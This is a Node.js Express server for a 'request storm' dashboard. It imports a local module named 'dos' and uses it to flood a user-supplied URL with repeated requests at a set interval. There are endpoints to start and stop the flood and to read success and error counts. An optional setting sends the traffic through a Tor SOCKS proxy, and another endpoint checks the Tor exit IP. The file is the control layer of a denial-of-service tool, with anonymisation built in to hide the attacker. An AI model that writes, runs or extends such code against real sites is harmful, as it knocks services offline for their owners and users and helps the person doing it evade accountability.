const express = require('express');
const path = require('path');
const dos = require('./IamHuppy');
const axios = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// Global controller for request storm
let stormController = null;

// Serve dashboard
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// Start request storm
app.post('/api/start', (req, res) => {
  try {
    const { url, requests, interval, useTor } = req.body;

    if (!url || !requests || !interval) {
      return res.status(400).json({ error: 'Missing parameters' });
    }

    // Stop existing storm if running
    if (stormController) {
      stormController.stop();
    }

    // Create proxy agent if Tor is enabled
    let options = {};
    if (useTor) {
      const proxyAgent = new SocksProxyAgent('socks5h://127.0.0.1:9150');
      options.agent = proxyAgent;
      console.log('[SERVER] Using Tor proxy for requests');
    }

    // Start new storm
    stormController = dos(url, requests, interval, options);
    console.log(`[SERVER] Started storm: ${requests} requests every ${interval}ms to ${url}${useTor ? ' [TOR]' : ''}`);

    res.json({ success: true, message: 'Request storm started', torEnabled: !!useTor });
  } catch (error) {
    console.error('Error starting storm:', error.message);
    res.status(500).json({ error: error.message });
  }
});

// Stop request storm
app.post('/api/stop', (req, res) => {
  try {
    if (stormController) {
      stormController.stop();
      stormController = null;
      console.log('[SERVER] Storm stopped');
      res.json({ success: true, message: 'Request storm stopped' });
    } else {
      res.status(400).json({ error: 'No active storm' });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get stats
app.get('/api/stats', (req, res) => {
  try {
    if (stormController) {
      const stats = stormController.getStats();
      res.json(stats);
    } else {
      res.json({ successCount: 0, errorCount: 0, total: 0 });
    }
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Check Tor IP
app.get('/api/torip', async (req, res) => {
  try {
    const agent = new SocksProxyAgent('socks5h://127.0.0.1:9150');

    const response = await axios.get('https://check.torproject.org/api/ip', {
      httpAgent: agent,
      httpsAgent: agent
    });

    res.json(response.data);
  } catch (error) {
    res.status(500).json({ error: 'Tor proxy unavailable', details: error.message });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`\n🚀 Request Storm Dashboard running at http://localhost:${PORT}`);
  console.log(`📊 Open your browser and go to http://localhost:${PORT}\n`);
});
